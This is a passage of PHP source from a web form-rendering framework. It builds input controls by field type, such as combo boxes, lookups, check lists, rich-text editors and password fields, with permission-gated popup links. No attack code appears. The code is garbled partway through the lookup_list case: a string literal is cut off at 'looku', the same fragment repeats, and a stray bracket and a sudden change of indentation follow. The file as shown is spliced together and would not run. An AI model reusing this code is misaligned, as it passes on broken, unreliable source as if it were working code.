              if (safe($field, 'entity_call_param'))
                $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
              $href = $url->build_url($url_params);
              $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_EDITOR, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_new.gif"
                                                                    , array("alt" => "Create New"))));
              $tmp_row->add(new table_cell("&nbsp;"));
            }
            if (safe($field, "entity_select") and $auth->can('browser_'.safe($field, "entity_select"), "render")) {
              $url_params = array( URL_PARAM_ACTION       => 'select'
                                 , URL_PARAM_ENTITY       => safe($field, "entity_select")
                                 , URL_PARAM_POPUP_WINDOW => 1
                                 );
              if (safe($field, 'entity_call_defaults'))
                $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
              if (safe($field, 'entity_call_param'))
                $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
              $href = $url->build_url($url_params);
              $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_SELECTOR, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_select.gif"
                                                                    , array("alt" => "Invoke Selector"))));
            }
            $cell->add(new table( array("cellspacing" => 0, "cellpadding" => 0), $tmp_row));
          } else 
            $cell->add($control);  
        }
        break;
      case "lookup":
        $btn_view = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."view";
        $btn_edit = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."edit";
        $attributes = array( "table"             => safe($field, "lookup_table")
                           , "sql_text"          => safe($field, "lookup_sql")
                           , "ajax_method"       => safe($field, "lookup_ajax_method")
                           , 'ajax_param'        => safe($field, 'lookup_ajax_param')
                           , "key_field"         => safe($field, "lookup_table_key_field")
                           , "order_field"       => safe($field, "lookup_table_order_field")
                           , "name_field"        => safe($field, "lookup_table_name_field")
                           , "value"             => $value
                           , "base_table_alias"  => safe($field, "lookup_table_alias")
                           , "key_value"         => $this->key()
                           , "read_only"         => $this->is_field_read_only($field)
                           );
        if (safe($field, "post_on_change"))
          $attributes["on_select"] = $this->js_post_back("edt_ui_change", $control_name);
        $control = new db_lookup( $attributes
                                , array( "id"          => $context_control_name
                                       , 'template_id' => $control_name
                                       , "class"       => "lookup"
                                       ));
        if ($this->is_field_read_only($field))
          $cell->add(new html_div($control, array("class" => "read_only")));
        else
        if (safe($field, "entity_insert") or safe($field, "entity_select") or safe($field, "entity_view") or safe($field, "entity_edit")) {
          global $url;
          global $auth;
          $tmp_row = new table_row( new table_cell($control)
                                  , new table_cell("&nbsp;"));
          if (safe($field, "entity_view") and $auth->can('editor_'.safe($field, "entity_view"), "render") and $auth->can('editor_'.safe($field, "entity_view"), "view")) {
            $href = $url->build_url(array( URL_PARAM_ACTION       => 'view'
                                         , URL_PARAM_ENTITY       => safe($field, "entity_view")
                                         , URL_PARAM_POPUP_WINDOW => 1
                                         , URL_PARAM_KEY          => PLACEHOLDER_KEY_ENC //$value
                                         ));
            $tmp_row->add(new table_cell(new javascript_image_href( sql_placeholder(OPEN_POPUP_EDITOR_OF_KEY, $href, $context_control_name."[value]")
                                                                  , SHARED_RESOURCES_URL."img_view.gif"
                                                                  , array("alt"   => "View"
                                                                         ,"style" => "display:".($value?"inline":"none")
                                                                         ,"id"    => $btn_view))));
            $tmp_row->add(new table_cell("&nbsp;"));
          }
//          if (safe($field, "entity_edit") and $auth->can('editor_'.safe($field, "entity_edit"), "render") and $auth->can('editor_'.safe($field, "entity_edit"), "edit")) {
//            $href = $url->build_url(array( URL_PARAM_ACTION       => 'edit'
//                                         , URL_PARAM_ENTITY       => safe($field, "entity_edit")
//                                         , URL_PARAM_POPUP_WINDOW => 1
//                                         , URL_PARAM_KEY          => PLACEHOLDER_KEY_ENC //$value
//                                         ));
//            $tmp_row->add(new table_cell(new javascript_image_href( sql_placeholder(OPEN_POPUP_EDITOR_OF_KEY, $href, $context_control_name."[value]")
//                                                                  , SHARED_RESOURCES_URL."img_update.gif"
//                                                                  , array("alt"   => "View"
//                                                                         ,"style" => "display:".($value?"inline":"none")
//                                                                         ,"id"    => $btn_view))));
//            $tmp_row->add(new table_cell("&nbsp;"));
//          }
          if (safe($field, "entity_insert") and $auth->can('editor_'.safe($field, "entity_insert"), "render") and $auth->can('editor_'.safe($field, "entity_insert"), "insert")) {
            $url_params = array( URL_PARAM_ACTION       => 'insert'
                               , URL_PARAM_ENTITY       => safe($field, "entity_insert")
                               , URL_PARAM_POPUP_WINDOW => 1
                               );
            if (safe($field, 'entity_call_defaults'))
              $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
            if (safe($field, 'entity_call_param'))
              $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
            $href = $url->build_url($url_params);
            $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_EDITOR, $href, $context_control_name."[value]")
                                                                  , SHARED_RESOURCES_URL."img_new.gif"
                                                                  , array("alt" => "Create New"))));
            $tmp_row->add(new table_cell("&nbsp;"));
          }
          if (safe($field, "entity_select") and $auth->can('browser_'.safe($field, "entity_select"), "render")) {
            $url_params = array( URL_PARAM_ACTION       => 'select'
                               , URL_PARAM_ENTITY       => safe($field, "entity_select")
                               , URL_PARAM_POPUP_WINDOW => 1
                               );
            if (safe($field, 'entity_call_defaults'))
              $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
            if (safe($field, 'entity_call_param'))
              $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
            $href = $url->build_url($url_params);
            $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_SELECTOR, $href, $context_control_name."[value]")
                                                                  , SHARED_RESOURCES_URL."img_select.gif"
                                                                  , array("alt" => "Invoke Selector"))));
          }
          $cell->add(new table( array("cellspacing" => 0, "cellpadding" => 0), $tmp_row));
        } else
          $cell->add($control);  
        break;
      case "combo":    
        global $auth;
        $attributes = array();
        $attributes['id'] = $context_control_name;
        $attributes['template_id'] = $control_name;
        $btn_view = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."view";
        $btn_edit = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."edit";
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        else 
        if (safe($field, "call_on_change"))
          $attributes["onchange"] = $field["call_on_change"].'(this);';
        else 
        if (safe($field, "entity_view") or safe($field, "entity_edit") ) {
          $attributes["onchange"] = '';
          if (safe($field, "entity_view") and $auth->can(safe($field, "entity_view"), "render") and $auth->can(safe($field, "entity_view"), "view")) 
            $attributes["onchange"] .= "__Editor_ShowIfSelected(this, '$btn_view');";
          if (safe($field, "entity_edit") and $auth->can(safe($field, "entity_edit"), "render") and $auth->can(safe($field, "entity_edit"), "edit")) 
            $attributes["onchange"] .= "__Editor_ShowIfSelected(this, '$btn_edit');";
        } else  
        if (safe($field, 'dependent_controls_visible')) {
          $script  = '__SyncDependentControlsVisible(this, "';
          foreach($field['dependent_controls_visible'] as $name)
            $script .= $this->context_id($name).';';
          $script = rtrim($script, ';').'"';
          $script .= ', '.($this->get_current_value($field_name)?$this->get_current_value($field_name):'null');
          $script .= ');';  
          $attributes["onchange"] = $script; 
        }
        if (safe($field, 'enabled_if_checked')) {
          if (!$this->get_current_value(safe($field, 'enabled_if_checked')))
            $attributes["disabled"] = true;
        }
        if (safe($field, 'enabled_if_not_checked')) {
          if ($this->get_current_value(safe($field, 'enabled_if_not_checked')))
            $attributes["disabled"] = true;
        }
        if ($read_only)  
          $attributes["disabled"] = true;
        if (safe($field, "class"))
          $attributes["class"] = $field['class'];
        if (safe($field, "style"))
          $attributes["style"] = $field['style'];
        if (safe($field, "width"))
          $attributes["style"] = safe($attributes, "style").'width:'.$field['width'].'px;';
        $control = new db_combo( array( "table"            => safe($field, "combo_table")
                                      , "sql_text"         => safe($field, "combo_sql")
                                      , "key_field"        => safe($field, "combo_key_field")
                                      , "name_field"       => safe($field, "combo_name_field")
                                      , "order_field"      => safe($field, "combo_order_field")
                                      , "base_table_alias" => safe($field, "combo_table_alias")
                                      , "required"         => safe($field, "required")
                                      , "selected"         => $value
                                      , "exceptions"       => (safe($field, "self_ref")?$this->key():null)
                                      , "read_only"        => $this->is_field_read_only($field)
                                      //, "max_value_length" => safe($field, "max_value_length")
                                      , "always_set"       => safe($field, "always_set")
                                      , "empty_name"       => safe($field, "empty_name")
                                      , "group_field"      => safe($field, "combo_group_field")
                                      )
                               , $attributes
                               );
        if ($this->is_field_read_only($field))
          $cell->add(new html_div($control, array("class" => "read_only")));
        else {
          if (safe($field, "entity_insert") or safe($field, "entity_select") or safe($field, "entity_view") or safe($field, "entity_edit")) {
            global $url;
            global $auth;
            $tmp_row = new table_row( new table_cell($control)
                                    , new table_cell("&nbsp;"));
            if (safe($field, "entity_view") and $auth->can('editor_'.safe($field, "entity_view"), "render") and $auth->can('editor_'.safe($field, "entity_view"), "view")) {
              $href = $url->build_url(array( URL_PARAM_ACTION       => 'view'
                                           , URL_PARAM_ENTITY       => safe($field, "entity_view")
                                           , URL_PARAM_POPUP_WINDOW => 1
                                           , URL_PARAM_KEY          => PLACEHOLDER_KEY_ENC //$value
                                           ));
              $tmp_row->add(new table_cell(new javascript_image_href( sql_placeholder(OPEN_POPUP_EDITOR_OF_KEY, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_view.gif"
                                                                    , array("alt"   => "View"
                                                                           ,"style" => "display:".($value?"inline":"none")
                                                                           ,"id"    => $btn_view))));
              $tmp_row->add(new table_cell("&nbsp;"));
            }
            if (safe($field, "entity_edit") and $auth->can('editor_'.safe($field, "entity_edit"), "render") and $auth->can('editor_'.safe($field, "entity_edit"), "edit")) {
              $href = $url->build_url(array( URL_PARAM_ACTION       => 'edit'
                                           , URL_PARAM_ENTITY       => safe($field, "entity_edit")
                                           , URL_PARAM_POPUP_WINDOW => 1
                                           , URL_PARAM_KEY          => PLACEHOLDER_KEY_ENC //$value
                                           ));
              $tmp_row->add(new table_cell(new javascript_image_href( sql_placeholder(OPEN_POPUP_EDITOR_OF_KEY, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_edit.gif"
                                                                    , array("alt"   => "Edit"
                                                                           ,"style" => "display:".($value?"inline":"none")
                                                                           ,"id"    => $btn_edit))));
              $tmp_row->add(new table_cell("&nbsp;"));
            }
            if (safe($field, "entity_insert") and $auth->can('editor_'.safe($field, "entity_insert"), "render") and $auth->can('editor_'.safe($field, "entity_insert"), "insert")) {
              $url_params = array( URL_PARAM_ACTION       => 'insert'
                                 , URL_PARAM_ENTITY       => safe($field, "entity_insert")
                                 , URL_PARAM_POPUP_WINDOW => 1
                                 );
              if (safe($field, 'entity_call_defaults'))
                $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
              if (safe($field, 'entity_call_param'))
                $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
              $href = $url->build_url($url_params);
              $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_EDITOR, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_new.gif"
                                                                    , array("alt" => "Create New"))));
              $tmp_row->add(new table_cell("&nbsp;"));
            }
            if (safe($field, "entity_select") and $auth->can('browser_'.safe($field, "entity_select"), "render")) {
              $url_params = array( URL_PARAM_ACTION       => 'select'
                                 , URL_PARAM_ENTITY       => safe($field, "entity_select")
                                 , URL_PARAM_POPUP_WINDOW => 1
                                 );
              if (safe($field, 'entity_call_defaults'))
                $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
              if (safe($field, 'entity_call_param'))
                $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
              $href = $url->build_url($url_params);
              $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_SELECTOR, $href, $context_control_name)
                                                                    , SHARED_RESOURCES_URL."img_select.gif"
                                                                    , array("alt" => "Invoke Selector"))));
            }
            $cell->add(new table( array("cellspacing" => 0, "cellpadding" => 0), $tmp_row));
          } else
            $cell->add($control);
        }
        break;
      case "combo_master_detail":
        $attributes = array();
        $attributes["id"] = $context_control_name;
        $attributes["template_id"] = $control_name;
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        $control = new db_master_detail_combo( array( "sql1"            => safe($field, "combo_sql1")
                                                    , "sql2"            => safe($field, "combo_sql2")
                                                    , "key_field"       => safe($field, "combo_key_field")
                                                    , "name_field"      => safe($field, "combo_name_field")
                                                    , "parent_field"    => safe($field, "combo_parent_field")
                                                    , "required"        => safe($field, "required")
                                                    , "selected"        => $value
                                                    , "read_only"       => $this->is_field_read_only($field)
                                                    )
                                             , $attributes
                                             );  
        if ($this->is_field_read_only($field))
          $cell->add(new html_div($control, array("class" => "read_only")));
        else
          $cell->add($control);  
        break;
      case "radio":   
        $attributes = array();
        $attributes["id"] = $context_control_name;
        $attributes["template_id"] = $control_name;
        $attributes["align"] = safe($field, "radio_align");
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        $control = new db_radio_box( array( "table"             => safe($field, "radio_table")
                                          , "sql_text"          => safe($field, "radio_sql")
                                          , "key_field"         => safe($field, "radio_key_field")
                                          , "name_field"        => safe($field, "radio_name_field")
                                          , "description_field" => safe($field, "radio_description_field")
                                          , "order_field"       => safe($field, "radio_order_field")
                                          , "selected"          => $value
                                          , "exceptions"        => (safe($field, "self_ref")?$this->key():null)
                                          , "required"          => safe($field, "required")
                                          , "read_only"         => $this->is_field_read_only($field)
                                          , "horizontal"        => safe($field, "radio_horizontal")
                                          )
                                   , $attributes
                                   );

        if ($this->is_field_read_only($field))
          $cell->add(new html_div($control, array("class" => "read_only")));
        else
          $cell->add($control);  
        break;
      case "values_radio": 
        $attributes = array();
        $attributes["id"] = $context_control_name;
        $attributes["template_id"] = $control_name;
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        if ($read_only)  
          $attributes["disabled"] = true;
        $box = new radio_box( $field["values"]
                            , array( "selected"   => $value
                                   , "read_only"  => $this->is_field_read_only($field)
                                   , "required"   => safe($field, "required")
                                   , "box_style"  => safe($field, "radio_box_style")
                                   , "box_class"  => safe($field, "radio_box_class")
                                   , "horizontal" => safe($field, "radio_horizontal")
                                   )
                            , $attributes
                            );
        if ($this->template_mode) {
          $box->set_template_id($control_name);
          $box->is_tree_templateable = true;
        }
        $cell->add($box);
        break;
      case "check_list":   
        $attributes = array();
        $attributes['id'] = $context_control_name;
        $attributes['template_id'] = $control_name;
        if ($read_only) 
          $attributes["disabled"] = true;
        $options = array( "table"                => safe($field, "check_list_table")
                        , "key_field"            => safe($field, "check_list_table_key_field")
                        , "name_field"           => safe($field, "check_list_table_name_field")
                        , "order_field"          => safe($field, "check_list_table_order_field")
                        , "sql_text"             => safe($field, "check_list_sql")
                        , "group_table"          => safe($field, "check_list_group_table")
                        , "group_field"          => safe($field, "check_list_group_field")
                        , "group_order_field"    => safe($field, "check_list_group_order_field") 
                        , "group_name_field"     => safe($field, "check_list_group_name_field") 
                        , "filter"               => safe($field, "check_list_filter")
                        , "show_groups"          => safe($field, "check_list_show_groups")
                        , "select_group"         => safe($field, "check_list_select_group")
                        , "group_mode"           => safe($field, "check_list_group_mode")
                        , 'group_value_modifier' => safe($field, 'check_list_group_value_modifier')
                        , "col_count"            => safe($field, "check_list_cols")
                        , "dic_table"            => safe($field, "check_list_dic_table")
                        , "dic_field"            => safe($field, "check_list_dic_field")
                        , "dic_group_field"      => safe($field, "check_list_dic_group_field")
                        , "dic_order_field"      => safe($field, "check_list_dic_order_field")
                        , "dic_empty_name"       => safe($field, "check_list_dic_empty_name")
                        , "selected"             => $value
                        , "read_only"            => $this->is_field_read_only($field)
                        , "link_table"           => safe($field, "check_list_link_table")
                        , "link_pk_field"        => safe($field, "check_list_link_pk_field")
                        , "link_fk_field"        => safe($field, "check_list_link_fk_field")
                        , "key_value"            => $this->key()
                        ); 
        if (safe($field, 'post_on_change'))
          $options["on_change"] = $this->js_post_back("edt_ui_change", $control_name);
        if (safe($field, 'check_list_form_filters')) {
          foreach($field['check_list_form_filters'] as $filter) {
            $control_visible = ($this->get_current_value($filter['form_filter']['field']) == $filter['form_filter']['value']);
            $options["hidden"]         = !$control_visible;
            $options["filter"]         = $filter['control_filter'];
            $options["check_table_id"] = $context_control_name.__HTML_CONTROL_NAME_SEPARATOR.'table['.$filter['form_filter']['value'].']';
            $control = new db_check_list($options, $attributes);
            if ($this->is_field_read_only($field)) {
              if ($control_visible) 
              $cell->add(new html_div($control, array("class" => "read_only")));
            } else
              $cell->add($control);  
          }
        } else {
          $control = new db_check_list($options, $attributes);
          if ($this->is_field_read_only($field))
            $cell->add(new html_div($control, array("class" => "read_only")));
          else
            $cell->add($control);  
        }
        break;
      case "list":  
        $attributes = array();
        $attributes['id'] = $context_control_name;
        $attributes['template_id'] = $control_name;
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
        if (safe($field, "style"))
          $attributes["style"] = $field['style'];
        $control = new db_list( array( "table"             => safe($field, "list_table")
                                     , "name_field"        => safe($field, "list_table_name_field")
                                     , "sql_text"          => safe($field, "list_sql")
                                     , "group_table"       => safe($field, "list_group_table")
                                     , "group_field"       => safe($field, "list_group_field")
                                     , "group_order_field" => safe($field, "list_group_order_field") 
                                     , "group_name_field"  => safe($field, "list_group_name_field") 
                                     , "order_field"       => safe($field, "list_order_field")
                                     , "filter"            => safe($field, "list_filter")
                                     , "show_groups"       => safe($field, "list_show_groups")
                                     , "select_group"      => safe($field, "list_select_group")
                                     , "group_mode"           => safe($field, "list_group_mode")
                                     , 'group_value_modifier' => safe($field, 'list_group_value_modifier')
                                     , "selected"          => $value
                                     , "read_only"         => $this->is_field_read_only($field)
                                     , "link_table"        => safe($field, "list_link_table")
                                     , "link_pk_field"     => safe($field, "list_link_pk_field")
                                     , "link_fk_field"     => safe($field, "list_link_fk_field")
                                     , "key_value"         => $this->key()
                                     , "size"              => safe($field, 'list_size', 10)
                                     )
                              , $attributes);

        //if ($this->template_mode) {
        //  $control->set_template_id($context_control_name);
        //  $control->is_tree_templateable = true;
        //}

        if ($this->is_field_read_only($field))
          $cell->add(new html_div($control, array("class" => "read_only")));
        else  
        if (safe($field, "entity_insert")) {
          global $url;
          global $auth;
          $tmp_row = new table_row();
          $tmp_row->add(new table_cell($control));
          $tmp_row->add(new table_cell("&nbsp;"));
          if (safe($field, "entity_insert") and $auth->can('editor_'.safe($field, "entity_insert"), "render") and $auth->can('editor_'.safe($field, "entity_insert"), "insert")) {
            $url_params = array( URL_PARAM_ACTION       => 'insert'
                               , URL_PARAM_ENTITY       => safe($field, "entity_insert")
                               , URL_PARAM_POPUP_WINDOW => 1
                               );
            if (safe($field, 'entity_call_defaults'))
              $url_params[URL_PARAM_DEFAULTS] = urlencode($field['entity_call_defaults']);
            if (safe($field, 'entity_call_param'))
              $url_params[URL_PARAM_CUSTOM_PARAM] = urlencode($field['entity_call_param']);
            $href = $url->build_url($url_params);
            $tmp_row->add(new table_cell(new javascript_image_href( placeholder(OPEN_POPUP_EDITOR, $href, $context_control_name)
                                                                  , SHARED_RESOURCES_URL."img_new.gif"
                                                                  , array("alt" => "Create New"))));
            $tmp_row->add(new table_cell("&nbsp;"));
          }
          $cell->add(new table( array("cellspacing" => 0, "cellpadding" => 0), $tmp_row));
        } else {
          $cell->add($control);  
        }
        break;
      case "lookup_list":
        $control = new db_lookup_list( array( "table"             => safe($field, "lookup_list_table")
                                            , "sql_text"          => safe($field, "lookup_list_sql")
                                            , "ajax_method"       => safe($field, "lookup_list_ajax_method")
                                            , "ajax_param"        => safe($field, "lookup_list_ajax_param")
                                            , "order_field"       => safe($field, "lookup_list_order_field")
                                            , "selected"          => $value
                                            , "base_table_alias"  => safe($field, "lookup_list_table_alias")
                                            , "read_only"         => $this->is_field_read_only($field)
                                            , "link_table"        => safe($field, "lookup_list_link_table")
                                            , "link_pk_field"     => safe($field, "lookup_list_link_pk_field")
                                            , "link_fk_field"     => safe($field, "lookup_list_link_fk_field")
                                            , "key_value"         => $this->key()
                                            )
                                     , array( "id"                => $context_control_name
                                            , "template_id"       => $control_name
                                            , "class"             => "looku          , "template_id"       => $control_name
                                            , "class"             => "looku                                                                                       ));
                if ($this->is_field_read_only($field))
                    $cell->add(new html_div($control, array("class" => "read_only")));
                else
                    $cell->add($control);  
                break;
            case "yesno": 
                $attributes = array();
                $attributes["id"] = $context_control_name;
                $attributes["template_id"] = $control_name;
                if (safe($field, "post_on_change"))
                    $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
                if (safe($field, 'enabled_if_checked')) {
                    if (!$this->get_current_value(safe($field, 'enabled_if_checked')))
                        $attributes["disabled"] = true;
                }
                if (safe($field, 'enabled_if_not_checked')) {
                    if ($this->get_current_value(safe($field, 'enabled_if_not_checked')))
                        $attributes["disabled"] = true;
                }
                $cell->add(new yesno_combo( array( "selected"  => $value
                                                                                 , "read_only" => $this->is_field_read_only($field)
                                                                                 )
                                                                    , $attributes
                                                                    ));
                break;
            case "set":
            case "enum":
                $attributes = array();
                $attributes["id"] = $context_control_name;
                $attributes["template_id"] = $control_name;
                if (safe($field, "post_on_change"))
                    $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
                if ($read_only)  
                    $attributes["disabled"] = true;
                if (safe($field, "style"))
                    $attributes["style"] = $field["style"];
                if ($type == "set"){
                    $attributes["multiple"] = true;
                    if (safe($field, "size")) $attributes["size"] = $field["size"];
                    $script_set = "$(document).ready(function() {
                        $('#".$context_control_name."').attr('name','".$context_control_name."[]');
                    });";
                    $this->add(new script($script_set));
                    $value = explode(',',$value);
                }
    
                $enum_row = $db->row("SHOW COLUMNS FROM `".$this->table."` LIKE '".$control_name."'");

                $enum_fields = array();
                if(preg_match("/(enum|set).*/",$enum_row['type'])){
                    $enum = array();
                    $enum = explode("','", preg_replace("/(enum|set)\('(.+?)'\)/","\\2", $enum_row['type'])); 
                    foreach($enum as $key => $item){
                        $enum_fields[$item] = $item;
                    }
                }
                $combo = new values_combo( $enum_fields
                                                                 , array( "selected"   => $value
                                                                                , "read_only"  => $this->is_field_read_only($field)
                                                                                , "required"   => safe($field, "required")
                                                                                , "always_set" => safe($field, "always_set")
                                                                                , "empty_name" => safe($field, "empty_name")
                                                                                )
                                                                 , $attributes
                                                                 );
                $cell->add($combo);
                break;
            case "values_combo":
                $attributes = array();
                $attributes["id"] = $context_control_name;
                $attributes["template_id"] = $control_name;
                if (safe($field, "post_on_change"))
                    $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
                if ($read_only)  
                    $attributes["disabled"] = true;
                $combo = new values_combo( $field["values"]
                                                                 , array( "selected"   => $value
                                                                                , "read_only"  => $this->is_field_read_only($field)
                                                                                , "required"   => safe($field, "required")
                                                                                , "always_set" => safe($field, "always_set")
                                                                                , "empty_name" => safe($field, "empty_name")
                                                                                )
                                                                 , $attributes
                                                                 );
                $cell->add($combo);
                break;
            case "checkbox": 
                $attributes = array();
                $attributes["id"]    = $context_control_name;
                $attributes["template_id"] = $control_name;
                $attributes["template_object"] = $this->template_object();
                if ($this->is_field_read_only($field)) 
                    $attributes["disabled"] = true;
                if ($value) 
                    $attributes["checked"] = true;
                if (safe($field, "class"))
                    $attributes["class"] = safe($field, "class");
                else  
                    $attributes["class"] = "checkbox";
                if (safe($field, "post_on_change"))
                    $attributes["onclick"] = $this->js_post_back("edt_ui_change", $control_name);
                if (safe($field, "on_click"))
                    $attributes["onclick"] = safe($field, "on_click");
                if (safe($field, "on_change"))
                    $attributes["onclick"] = safe($field, "on_change");
                if (safe($field, 'dependent_controls_enable')) {
                    $script  = '__SyncDependentControls(this, "';
                    foreach($field['dependent_controls_enable'] as $name)
                        $script .= $this->context_id($name).';';
                    $script = rtrim($script, ';').'");';  
                    $attributes["onchange"] = $script; 
                }  
                if (safe($field, 'dependent_controls_disable')) {
                    $script  = '__SyncDependentControls(this, "';
                    foreach($field['dependent_controls_disable'] as $name)
                        $script .= $this->context_id($name).';';
                    $script = rtrim($script, ';').'", true);';  
                    $attributes["onchange"] = $script; 
                }  
                $cell->add(new check_label(safe($field, "check_label"), $attributes));
                break;
      case "memo":
        if ($this->is_field_read_only($field)) {
          if (safe($field, "html") || safe($field, "rtf") || safe($field, "rtf_std") || safe($field, "rtf_adv")) {
            $cell->add(new html_div(for_html($value, array( "decorate_url" => safe($field, "decorate_url"), "no_htmlize" => true, "no_nl2br" => true)), array("class" => "read_only")));
          } else
          if (safe($field, "code") && safe($field, 'language')) {
            $attributes = array( "id"           => $context_control_name
                               , "template_id"  => $control_name
                               , "rows"         => safe($field, "rows", 6)
                               , "cols"         => safe($field, "cols", 60)
                               , "line_numbers" => safe($field, 'line_numbers')
                               , "read_only"    => true
                               );
            $attributes["language"] = $field["language"];
            $cell->add(new code_editor($value, $attributes));
          } else
            $cell->add(new html_div(for_html($value, array( "decorate_url" => safe($field, "decorate_url"))), array("class" => "read_only")));
        } else {
          if (safe($field, "html") || safe($field, "rtf") || safe($field, "rtf_adv") || safe($field, "rtf_std")) {
            $attributes = array( "id"            => $context_control_name
                               , "template_id"   => $control_name
                               , "rows"          => safe($field, "rows", 6)
                               , 'external_css'  => safe($field, "external_css")
                               , 'images_folder' => safe($field, "images_folder")
                               , 'images_url'    => safe($field, "images_url")
                               , 'rename_images' => safe($field, "rename_images")
                               );
            if (safe($field, "cols"))
              $attributes['cols'] = safe($field, "cols");
            if (safe($field, 'replace_before_edit')) {
              foreach($field['replace_before_edit'] as $rule => $replacement)
                $value = preg_replace($rule, $replacement, $value);
            }
            $cell->add(new nic_editor($value, $attributes));
          } else
          if (safe($field, "fckeditor")) {
            $attributes = array( "id"            => $context_control_name
                               , "template_id"   => $control_name
                               , "rows"          => safe($field, "rows", 6)
                               , 'external_css'  => safe($field, "external_css")
                               , 'full_page'     => safe($field, "full_page")
                               , 'images_folder' => safe($field, "images_folder")
                               , 'images_url'    => safe($field, "images_url")
                               , 'rename_images' => safe($field, "rename_images")
                               );
            if (safe($field, "cols"))
              $attributes['cols'] = safe($field, "cols");
            if (safe($field, 'replace_before_edit')) {
              foreach($field['replace_before_edit'] as $rule => $replacement)
                $value = preg_replace($rule, $replacement, $value);
            }         
            $cell->add(new fck_editor($value, $attributes));
          } else
          if (safe($field, "ckeditor")) {
            $attributes = array( "id"            => $context_control_name
                               , "template_id"   => $control_name
                               , "rows"          => safe($field, "rows", 6)
                               , 'external_css'  => safe($field, "external_css")
                               , 'full_page'     => safe($field, "full_page")
                               , 'images_folder' => safe($field, "images_folder")
                               , 'images_url'    => safe($field, "images_url")
                               , 'rename_images' => safe($field, "rename_images")
                               );
            if (safe($field, "cols"))
              $attributes['cols'] = safe($field, "cols");
            if (safe($field, 'replace_before_edit')) {
              foreach($field['replace_before_edit'] as $rule => $replacement)
                $value = preg_replace($rule, $replacement, $value);
            }         
            $cell->add(new ck_editor($value, $attributes));
          } else
          if (safe($field, "code")) {
            $attributes = array( "id"           => $context_control_name
                               , "template_id"  => $control_name
                               , "rows"         => safe($field, "rows", 6)
                               , "cols"         => safe($field, "cols", 60)
                               , "line_numbers" => safe($field, 'line_numbers')
                               );
            if (safe($field, "language")) {
              $attributes["language"] = $field["language"];
              $cell->add(new code_editor($value, $attributes));
            } else {
              $attributes["class"] = safe($field, "class", ($sub_container?"embedded_code":"code"));
              $cell->add(new memo_editor($value, $attributes));
            }
          } else {
            $attributes = array( "id"              => $context_control_name
                               , "template_id"     => $control_name
                               , 'template_object' => $this->template_object()
                               , "rows"            => safe($field, "rows", 6)
                               , "cols"            => safe($field, "cols", 60)
                               , "class"           => safe($field, "class", ($sub_container?"embedded":"textarea"))
                               );
            if (safe($field, 'enabled_if_checked')) {
              if (!$this->get_current_value(safe($field, 'enabled_if_checked')))
                $attributes["disabled"] = true;
            }
            if (safe($field, 'enabled_if_not_checked')) {
              if ($this->get_current_value(safe($field, 'enabled_if_not_checked')))
                $attributes["disabled"] = true;
            }
            if ($read_only)
              $attributes["disabled"] = true;
            if (safe($field, "render") and ($value)) {
              $memo_page_control = new page_control();
              $memo_page = new page("Value");
              
              $memo_page->add(new memo_editor($value, $attributes));
              $memo_page_control->add_page($memo_page);
              
              $memo_page = new page("Text");
              $memo_page->add(new text(for_html($value)));
              $memo_page_control->add_page($memo_page);
              
              $cell->add($memo_page_control); 
              
            } else {
              $cell->add(new memo_editor($value, $attributes));
            }
          }
        }
        break;
      case "plain_password":
      case "password":
        if (!$this->is_field_read_only($field)) {
          $attributes = array( "id"              => $context_control_name
                             , "template_id"     => $control_name
                             , 'template_object' => $this->template_object()
                             , "value"           => $value
                             , "class"           => "password"
                             );
          if ($read_only)  
            $attributes["disabled"] = true;
          $cell->add(new password($attributes));
        }                               
        break;
      case "credit_card":
        if ($this->is_field_read_only($field)) 
          $cell->add(new html_div($value, array("class" => "read_only")));
        else
        if (safe($field, "max_length"))
          $cell->add(new edit(array( "id"          => $context_control_name
                                   , "template_id" => $control_name
                                   , "value"       => $value
                                   , "class"       => "credit_card"
                                   , "maxlength"   => $field["max_length"]
                                   )));
        else                           
          $cell->add(new edit(array( "id"        => $context_control_name
                                   , "template_id" => $control_name
                                   , "value"     => $value
                                   , "class"     => "credit_card"
                                   , "maxlength" => 16
                                   )));
        break;
      case "ipv4":
        if ($this->is_field_read_only($field)) 
          $cell->add(new html_div($value, array("class" => "read_only")));
        else
